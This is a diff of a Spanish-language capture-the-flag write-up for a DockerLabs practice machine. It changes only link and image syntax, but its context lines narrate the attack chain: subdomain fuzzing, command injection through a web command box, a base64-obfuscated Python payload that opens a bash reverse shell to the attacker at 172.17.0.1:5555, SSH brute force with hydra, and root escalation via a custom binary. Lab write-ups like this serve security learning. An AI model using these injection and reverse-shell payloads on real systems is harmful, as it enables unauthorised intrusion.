@@ -3,11 +3,11 @@
 ### Escaneo de Puertos (Nmap)
 Realizamos un escaneo de puertos inicial con nmap para identificar los servicios activos en la máquina objetivo:
 
-![[Pasted image 20260805000332.png]]
+![Pasted image 20260805000332.png](../../../assets/Pasted%20image%2020260805000332.png)
 
 **Servicios identificados:**
-* **Puerto 22/TCP (SSH):** Servicio OpenSSH abierto para acceso remoto. Ver teoría en [[Pentesting Notes/1_Enumeration/SSH\|SSH.md]].
-* **Puerto 80/TCP (HTTP):** Servidor web Apache corriendo en el host. Ver teoría en [[Pentesting Notes/1_Enumeration/HTTP & HTTPS\|HTTP & HTTPS.md]].
+* **Puerto 22/TCP (SSH):** Servicio OpenSSH abierto para acceso remoto. Ver teoría en [SSH.md](../../../Pentesting%20Notes/1_Enumeration/SSH.md).
+* **Puerto 80/TCP (HTTP):** Servidor web Apache corriendo en el host. Ver teoría en [HTTP & HTTPS.md](../../../Pentesting%20Notes/1_Enumeration/HTTP%20%26%20HTTPS.md).
 
 * **Configuración de Dominio:** El escaneo reporta que el sitio web apunta al dominio `internal.dl`. Procedemos a añadirlo al archivo `/etc/hosts` de nuestra máquina atacante para permitir la resolución de nombres:
 ```text
@@ -21,7 +21,7 @@ Realizamos un escaneo de puertos inicial con nmap para identificar los servicios
 ### Fuzzing de Subdominios (Virtual Hosts)
 Tras realizar fuzzing de directorios tradicionales en `internal.dl` sin resultados relevantes, procedemos a realizar fuzzing de virtual hosts para descubrir subdominios activos:
 
-![[Pasted image 20260805001854.png]]
+![Pasted image 20260805001854.png](../../../assets/Pasted%20image%2020260805001854.png)
 
 * **Subdominio Descubierto:** Identificamos el subdominio `backup.internal.dl`. Lo agregamos a nuestro `/etc/hosts`:
 ```text
@@ -31,7 +31,7 @@ Tras realizar fuzzing de directorios tradicionales en `internal.dl` sin resultad
 ### Inspección del Subdominio
 Al acceder a `backup.internal.dl` a través del navegador, encontramos una interfaz web con una caja de entrada de comandos:
 
-![[Pasted image 20260805001914.png]]
+![Pasted image 20260805001914.png](../../../assets/Pasted%20image%2020260805001914.png)
 
 ---
 
@@ -48,7 +48,7 @@ Construimos un payload codificado en base64 que importa el módulo `os` de Pytho
 | printf "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScp" | base64 -d | python3
 ```
 
-![[Pasted image 20260805004426.png]]
+![Pasted image 20260805004426.png](../../../assets/Pasted%20image%2020260805004426.png)
 
 * **Resultado:** La ejecución tiene éxito y nos devuelve el usuario `www-data`.
 
@@ -70,11 +70,11 @@ Enviamos la petición a través de Burp Suite con el payload codificado para URL
 |+printf+"aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2Jhc2ggLWMgXCJiYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4wLjEvNTU1NSAwPiYxXCInKQ=="+|+base64+-d+|+python3
 ```
 
-![[Pasted image 20260805004853.png]]
+![Pasted image 20260805004853.png](../../../assets/Pasted%20image%2020260805004853.png)
 
 Recibimos la conexión en nuestra máquina atacante en el puerto 5555:
 
-![[Pasted image 20260805004919.png]]
+![Pasted image 20260805004919.png](../../../assets/Pasted%20image%2020260805004919.png)
 
 * **Estabilización de Shell (TTY):** Realizamos el tratamiento estándar de la terminal:
 ```bash
@@ -92,16 +92,16 @@ export TERM=xterm && export SHELL=bash
 ### Pivotaje al Usuario vault
 Leemos el archivo `/etc/passwd` y localizamos al usuario `vault`:
 
-![[Pasted image 20260805010809.png]]
+![Pasted image 20260805010809.png](../../../assets/Pasted%20image%2020260805010809.png)
 
 Realizamos una búsqueda de archivos en el sistema relacionados con este usuario o que contengan su nombre:
 
-![[Pasted image 20260805010855.png]]
+![Pasted image 20260805010855.png](../../../assets/Pasted%20image%2020260805010855.png)
 
 * **Hallazgo:** Descubrimos el archivo `.vault_pass.txt` en el directorio de copias de seguridad de la web.
 * **Fuerza Bruta SSH:** Utilizamos las palabras o la credencial del archivo para realizar fuerza bruta al servicio SSH mediante hydra con el usuario `vault`:
 
-![[Pasted image 20260805010926.png]]
+![Pasted image 20260805010926.png](../../../assets/Pasted%20image%2020260805010926.png)
 
 * **Resultado:** Obtenemos la contraseña correcta de SSH y nos conectamos al sistema:
 
@@ -109,7 +109,7 @@ Realizamos una búsqueda de archivos en el sistema relacionados con este usuario
 ssh vault@172.17.0.2
 ```
 
-![[Pasted image 20260805011027.png]]
+![Pasted image 20260805011027.png](../../../assets/Pasted%20image%2020260805011027.png)
 
 ### Escalada a root (vaultctl)
 Una vez iniciada la sesión como `vault`, buscamos binarios o permisos especiales. Identificamos un ejecutable personalizado en las rutas del sistema:
@@ -121,12 +121,12 @@ Una vez iniciada la sesión como `vault`, buscamos binarios o permisos especiale
 /usr/local/bin/vaultctl
 ```
 
-![[Pasted image 20260805011157.png]]
+![Pasted image 20260805011157.png](../../../assets/Pasted%20image%2020260805011157.png)
 
 * **Resultado:** Obtenemos acceso completo como root.
 
 ---
 
 ## Relaciones y Conceptos
-* **Teoría:** [[Pentesting Notes/1_Enumeration/HTTP & HTTPS\|HTTP & HTTPS.md]], [[Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions\|Linux Privilege Escalation - Permissions.md]]
-* **Laboratorios Relacionados:** [[Laboratorios/DockerLabs/Facil/Internship\|Internship]] (Comparte fuzzing de subdominios / vhosts)
+* **Teoría:** [HTTP & HTTPS.md](../../../Pentesting%20Notes/1_Enumeration/HTTP%20%26%20HTTPS.md), [Linux Privilege Escalation - Permissions.md](../../../Pentesting%20Notes/3_Post-Explotation/Linux%20Privilage%20Escalation/Permissions.md)
+* **Laboratorios Relacionados:** [Internship](../../../Laboratorios/DockerLabs/Facil/Internship.md) (Comparte fuzzing de subdominios / vhosts)
